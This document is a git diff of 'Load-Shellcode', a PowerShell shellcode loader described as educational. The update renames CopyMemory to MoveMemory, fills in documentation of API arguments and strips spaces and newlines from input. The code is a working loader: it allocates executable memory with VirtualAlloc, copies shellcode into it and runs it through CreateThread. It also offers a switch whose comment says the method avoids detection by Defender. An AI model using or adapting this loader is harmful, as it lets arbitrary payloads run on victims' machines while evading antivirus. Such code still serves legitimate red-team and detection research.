@@ -1,7 +1,7 @@
 ﻿function Load-Shellcode {
 #.SYNOPSIS
 # Educational PowerShell-based Shellcode Loader
-# Arbitary Version Number: v1.0.0
+# Arbitary Version Number: v1.0.1
 # Author: Tyler McCann (@tylerdotrar)
 #
 #.DESCRIPTION
@@ -19,7 +19,7 @@
 # shellcode formats.  Currently supports strings [string] and byte arrays [byte[]].
 #
 # Supported String Formats:
-#   > Path to Raw Shellcode   : '.\shellcode.bin'
+#   > Path to Raw Shellcode   : .\shellcode.bin
 #   > Python Shellcode Format : 'b"\x45\x78\x61\x6d\x70\x6c\x65"'
 #   > C Shellcode Format      : '\x45\x78\x61\x6d\x70\x6c\x65'
 #   > C++/C# Shellcode Format : '{0x45,0x78,0x61,0x70,0x6c,0x65}'
@@ -33,20 +33,18 @@
 # https://github.com/tylerdotrar/ShellcodeLoaderPS
 
     Param(
-        $Shellcode,      # Intentionally vague type for maximum compatibility
+        $Shellcode, # Intentionally vague type for maximum compatibility
         [switch]$Please,
         [switch]$Help
     )
 
 
     # Return Get-Help information
-    if ($Help) { return (Get-Help Execute-Shellcode) }
+    if ($Help) { return (Get-Help Load-Shellcode) }
 
 
     # Error Correction
     if (!$Shellcode) { return (Write-Host '[!] Error! Missing shellcode.' -ForegroundColor Red) }
-    if (!$Method2)   { $Method1 = $TRUE  }
-    if ($Method1)    { $Method2 = $FALSE }
 
 
     # Print data type
@@ -63,6 +61,8 @@
 
     if ($Shellcode -is [String]) {
         
+        $Shellcode = $Shellcode.Replace("`n",'')
+       
         # Check if $Shellcode is a path to a shellcode file
         if (Test-Path -LiteralPath $Shellcode) {
             
@@ -79,6 +79,7 @@
             Write-Host " o  --> Formatting for PowerShell..."
 
             # Convert to PowerShell ASCII array
+            $Shellcode = $Shellcode.Replace(' ','')
             $psShellcode = (($Shellcode.Replace('b"','').Replace('"','')).Split('\'))[1..$Shellcode.Length]
 
             # Convert Shellcode ASCII array to Byte Array
@@ -92,6 +93,7 @@
             Write-Host " o  --> Formatting for PowerShell..."
 
             # Convert to PowerShell ASCII array
+            $Shellcode = $Shellcode.Replace(' ','')
             $psShellcode = (($Shellcode.Replace('{0x','').Replace('}','')).Split(',0x')) | % { if ($_ -ne "") { $_ } }
 
             # Convert Shellcode ASCII array to Byte Array
@@ -126,29 +128,23 @@ public class Win32 {
     [DllImport("Kernel32.dll")]
     public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 
+    [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory")]
+    public static extern void MoveMemory(IntPtr dest, IntPtr src, uint size);
+
     [DllImport("Kernel32.dll")]
     public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
 
     [DllImport("Kernel32.dll")]
     public static extern UInt32 WaitForSingleObject(IntPtr hHandle, int dwMilliseconds);
-
-    [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory")]
-    public static extern void CopyMemory(IntPtr dest, IntPtr src, uint size);
-}
-
-// Funky Kernel32 function due to unmanaged memory requirements
-public class UnsafeNative {
-    [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory")]
-    public static extern void CopyMemory(IntPtr dest, IntPtr src, uint size);
 }
 '@
             Add-Type -TypeDefinition $Win32Api -PassThru
         }
         
-        # Method 2: this goofy method doesn't get caught my defender, but is very noisy
+        # Method 2: this goofy method doesn't get caught by defender, but is very noisy
         else {
             Add-Type -Namespace Var1 -Name Api -Passthru -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);'
-            Add-Type -Namespace Var2 -Name Api -Passthru -MemberDefinition '[DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory")] public static extern void CopyMemory(IntPtr dest, IntPtr src, uint size);'
+            Add-Type -Namespace Var2 -Name Api -Passthru -MemberDefinition '[DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory")] public static extern void MoveMemory(IntPtr dest, IntPtr src, uint size);'
             Add-Type -Namespace Var3 -Name Api -Passthru -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);'
             Add-Type -Namespace Var4 -Name Api -Passthru -MemberDefinition '[DllImport("Kernel32.dll")] public static extern UInt32 WaitForSingleObject(IntPtr hHandle, int dwMilliseconds);'
         }
@@ -165,9 +161,9 @@ public class UnsafeNative {
     #    Location    >  Kernel32.dll
     #    Reference   >  https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
     #
-    #   ----------          ------      ------------
-    #    Argument            Type        Definition
-    #   ----------          ------      ------------
+    #  ----------          ------      ------------
+    #   Argument            Type        Definition
+    #  ----------          ------      ------------
     #  > lpAddress         > [IntPtr]  > starting address in memory to allocate (if null, system dynamiclly determines where this is)
     #  > dwSize            > [Int]     > size of memory to allocate             (i.e., size of shellcode)
     #  > flAllocationType  > [Int]     > memory allocation flags                (i.e., MEM_COMMIT and MEM_RESERVE flags)
@@ -194,28 +190,29 @@ public class UnsafeNative {
 
     ### Copy shellcode into allocated memory
 
-    # CopyMemory()
+    # MoveMemory()
     #
-    #    Definition  >  Copies a block of memory from one location to another.
+    #    Definition  >  Moves a block of memory from one location to another.
     #    Location    >  Kernel32.dll
     #    Reference   >  https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa366535(v=vs.85)
+    #    Reference   >  https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa366788(v=vs.85)
     #
-    #   ----------          ------      ------------
-    #    Argument            Type        Definition
-    #   ----------          ------      ------------
+    #  ----------          ------      ------------
+    #   Argument            Type        Definition
+    #  ----------          ------      ------------
     #  > Destination       > [IntPtr]  > destination address in memory to copy to (i.e., executable memory address pointer)
     #  > Source            > [IntPtr]  > source address of block to copy from     (i.e., address pointer containing the shellcode byte array)
     #  > Length            > [Int]     > size of the memory block to copy         (i.e., length of the shellcode byte array)
 
-    Write-Host "[!] Copying shellcode to allocated memory..." -ForegroundColor Yellow
+    Write-Host "[!] Moving shellcode to allocated memory..." -ForegroundColor Yellow
 
     # Copy method via pinning memory address of shellcode byte array variable
     Try {
         $gch    = [Runtime.InteropServices.GCHandle]::Alloc($psByteArray, 'Pinned')
         $srcPtr = $gch.AddrOfPinnedObject()
 
-        if (!$Please) { [Win32]::CopyMemory($shellAddr, $srcPtr, $shellSize)    }
-        else          { [Var2.Api]::CopyMemory($shellAddr, $srcPtr, $shellSize) }
+        if (!$Please) { [Win32]::MoveMemory($shellAddr, $srcPtr, $shellSize)    }
+        else          { [Var2.Api]::MoveMemory($shellAddr, $srcPtr, $shellSize) }
 
         $gch.free | Out-Null
 
@@ -224,7 +221,7 @@ public class UnsafeNative {
     }
     Catch { return (Write-Host '[!] Error! Failed to move memory block.' -ForegroundColor Red) }
     
-    Write-Host " o  CopyMemory()"
+    Write-Host " o  MoveMemory()"
     Write-host " o  --> Source Shellcode Variable Address (non-executable) : $srcPtr"
     Write-Host " o  --> Destination Memory Address (executable)            : $shellAddr"
     Write-host " o  --> Shellcode Size                                     : $shellSize bytes"
@@ -234,17 +231,19 @@ public class UnsafeNative {
 
     # CreateThread()
     #
-    #    Definition  >  TBD
+    #    Definition  >  Create a thread to execute within the address space of the calling process.
     #    Location    >  Kernel32.dll
     #    Reference   >  https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
     #
-    #   ----------      ------      ------------
-    #    Argument        Type        Definition
-    #   ----------      ------      ------------
-    #  > TBD           > TBD       > TBD
-    #  > TBD           > TBD       > TBD
-    #  > TBD           > TBD       > TBD
-    #  > TBD           > TBD       > TBD
+    #  ----------            ------      ------------
+    #   Argument              Type        Definition
+    #  ----------            ------      ------------
+    #  > lpThreadAttributes  > [IntPtr]  > pointer to SECURITY_ATTRIBUTES struct                     (i.e., no pointer means handle cannot be inherited)
+    #  > dwStackSize         > [Int]     > initial size of the stack in bytes                        (i.e., 0 means the new thread uses the default size)
+    #  > lpStartAddress      > [IntPtr]  > pointer to the memory address to be executed              (i.e., executable shellcode memory address)
+    #  > lpParameter         > [IntPtr]  > pointer to a variable to be passed to the thread          (i.e., 0 means none)
+    #  > dwCreationFlags     > [Int]     > creation flags of the thread                              (i.e., 0 means the thread runs immediately after creation)
+    #  > lpThreadId          > [IntPtr]  > pointer to a variable that receives the thread identifier (i.e., null means nothing is returned)
 
     Write-Host "[!] Executing shellcode..." -ForegroundColor Yellow
 
@@ -264,15 +263,15 @@ public class UnsafeNative {
 
     # WaitForSingleObject()
     #
-    #    Definition  >  TBD
+    #    Definition  >  Wait until an specified object returns a signal (or until a timeout elapses).
     #    Location    >  Kernel32.dll
     #    Reference   >  https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject
     #
-    #   ----------      ------      ------------
-    #    Argument        Type        Definition
-    #   ----------      ------      ------------
-    #  > TBD           > TBD       > TBD
-    #  > TBD           > TBD       > TBD
+    #  ----------        ------      ------------
+    #   Argument          Type        Definition
+    #  ----------        ------      ------------
+    #  > hHandle         > [IntPtr]  > handle to the target object                 (i.e., handle to executed shellcode)
+    #  > dwMilliseconds  > [Int]     > time-out interval to wait for object signal (i.e., -1 will wait indefinitely until the object signals)
 
     Write-Host "[!] Waiting for thread to finish..." -ForegroundColor Yellow
 
